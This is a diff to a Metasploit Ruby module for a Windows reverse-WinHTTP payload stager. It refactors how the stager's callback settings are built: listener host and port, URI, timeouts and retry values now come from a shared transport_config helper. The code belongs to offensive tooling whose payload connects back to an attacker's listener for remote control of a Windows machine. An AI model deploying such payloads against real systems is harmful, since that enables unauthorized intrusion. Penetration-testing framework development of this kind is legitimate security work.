@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 require 'msf/core/payload/windows/reverse_http'
@@ -18,13 +19,6 @@ module Msf
 module Payload::Windows::ReverseWinHttp
 
   include Msf::Payload::Windows::ReverseHttp
-
-  #
-  # Register reverse_winhttp specific options
-  #
-  def initialize(*args)
-    super
-  end
 
   #
   # Generate the first stage
@@ -52,25 +46,8 @@ module Payload::Windows::ReverseWinHttp
     generate_reverse_winhttp(conf)
   end
 
-  def generate_transport_config(opts={})
-    # most cases we'll haev a URI already, but in case we don't
-    # we should ask for a connect to happen given that this is
-    # going up as part of the stage.
-    uri = opts[:uri]
-    unless uri
-      sum = uri_checksum_lookup(:connect)
-      uri = generate_uri_uuid(sum, opts[:uuid])
-    end
-
-    {
-      :scheme       => 'http',
-      :lhost        => datastore['LHOST'],
-      :lport        => datastore['LPORT'].to_i,
-      :uri          => uri,
-      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
-      :retry_total  => datastore['SessionRetryTotal'].to_i,
-      :retry_wait   => datastore['SessionRetryWait'].to_i
-    }
+  def transport_config(opts={})
+    transport_config_reverse_http(opts)
   end
   #
   # Generate and compile the stager
